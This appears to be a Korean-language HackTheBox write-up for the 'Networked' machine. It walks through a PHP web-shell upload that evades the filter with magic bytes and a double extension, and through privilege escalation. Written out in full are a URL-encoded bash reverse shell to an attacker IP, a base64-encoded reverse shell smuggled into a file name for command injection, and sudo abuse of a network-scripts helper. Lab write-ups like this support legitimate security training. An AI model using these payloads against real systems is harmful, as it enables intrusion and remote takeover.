# Networked - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA networked 10.129.16.180
```
<img width="1104" height="362" alt="image" src="https://github.com/user-attachments/assets/d5030ec5-f2a3-4e30-986a-6e72bfbe3100" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1104" height="247" alt="image" src="https://github.com/user-attachments/assets/d40c8ef1-e8fa-48cb-8ad6-3688b33f29bc" />

### gobuster
<img width="1104" height="482" alt="image" src="https://github.com/user-attachments/assets/64effa2f-c556-489b-9d8d-38a6947e4cfc" />

### Upload Web Shell
- `/upload.php`경로에서 이미지 업로드 가능.
<img width="440" height="80" alt="image" src="https://github.com/user-attachments/assets/f2e84d7d-9621-4d46-9305-ef20cc40ca57" />

<br>
<br>

- `/photos.php`에서 업로드 파일 확인.
<img width="1366" height="282" alt="image" src="https://github.com/user-attachments/assets/9737d7a3-6fce-45e6-9139-edf43910b4cb" />

<br>
<br>

- Web Shell 코드에 매직바이트를 추가해주고, 파일 확장자의 마지막에 `jpeg`를 추가.
<img width="1104" height="113" alt="image" src="https://github.com/user-attachments/assets/062c8114-208f-49fc-855e-d1e7c8446ffe" />

<br>
<br>

- 업로드 성공.
<img width="407" height="83" alt="image" src="https://github.com/user-attachments/assets/e06883db-84be-4747-b834-7d2a6f9f3695" />

<br>
<br>

- 명령어 실행.
```bash
curl 'http://10.129.16.181/uploads/10_10_14_23.php.jpeg/?cmd=whoami'
```
<img width="1106" height="103" alt="image" src="https://github.com/user-attachments/assets/36da1df0-6a9d-46c0-a88d-9219a2051b18" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://10.129.16.181/uploads/10_10_14_23.php.jpeg/?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.23%2F80%200%3E%261%22'
```
<img width="1106" height="63" alt="image" src="https://github.com/user-attachments/assets/ba1b06a4-d1fc-4262-a81a-24929ebb24e3" />

<br>
<br>

- 셸 획득.
<img width="1106" height="159" alt="image" src="https://github.com/user-attachments/assets/12d1edfe-41d1-4a6b-933a-a142ed95aa2b" />

---
## Privesc
- `/home/guly`에 접근 가능.
<img width="1106" height="213" alt="image" src="https://github.com/user-attachments/assets/a10e064f-1ed0-4297-8244-2009971974c9" />

<br>
<br>

- 주기적으로 `check_attack.php`가 실행된다고 가정.
<img width="1106" height="40" alt="image" src="https://github.com/user-attachments/assets/88f29a1a-78b0-4c07-beda-383260df56cf" />

<br>
<br>

- `path`변수는 지정되어 있으나 `value`변수를 제대로 검증하지 않아서 Command Injection이 가능할 것이라 가정.
<img width="1103" height="429" alt="image" src="https://github.com/user-attachments/assets/8e7825a7-0d08-489d-b750-8e990fd69d90" />

<br>
<br>

- `/var/www/html/uploads`에 리버스 셸 명령어를 파일로 생성.
```bash
touch ';echo YmFzaCAgLWkgPiYvZGV2L3RjcC8xMC4xMC4xNC4yMy84MCAwPiYx|base64 -d|bash;'
```
<img width="1103" height="229" alt="image" src="https://github.com/user-attachments/assets/2380d0f5-12dc-49be-8925-3ee2f7eb02f7" />

<br>
<br>

- `guly` 셸 획득.
<img width="1103" height="157" alt="image" src="https://github.com/user-attachments/assets/105c0d76-25e1-42e0-b643-fa11a30d2e1c" />

<br>
<br>

- `/usr/local/sbin/changename.sh`를 `root`권한으로 실행 가능.
<img width="1103" height="230" alt="image" src="https://github.com/user-attachments/assets/f133e572-2ab5-46ab-9ee2-a59f2323adb2" />

<br>
<br>

- 스크립트를 실행하면 입력에 따라서 `network-scripts`파일을 수정이 가능.
<img width="1103" height="420" alt="image" src="https://github.com/user-attachments/assets/8a8dc421-12fb-455b-97e4-c03b2deef357" />

<br>
<br>

- https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html?highlight=ifcf#etcsysconfignetwork-scripts-centosredhat
- 입력을 받을 때 공백을 허용하기 때문에 Command Injection이 가능하게 됨.
```bash
sudo /usr/local/sbin/changename.sh
```
<img width="1103" height="364" alt="image" src="https://github.com/user-attachments/assets/0a0ff09c-77b7-42f2-90ef-3ca523ef9763" />

<br>
<br>

- 셸 실행.
<img width="1103" height="211" alt="image" src="https://github.com/user-attachments/assets/ac13d993-5a20-40bd-b362-39d0d52c6efe" />

---
## FLAG
- `/home/guly/user.txt`
<img width="1103" height="211" alt="image" src="https://github.com/user-attachments/assets/b760f897-f7ab-48a8-9b28-0dc4cebcc62a" />

<br>
<br>

- `/root/root.txt`
<img width="1103" height="231" alt="image" src="https://github.com/user-attachments/assets/e5f9f8e7-269b-4c40-b389-9a22ec21a623" />
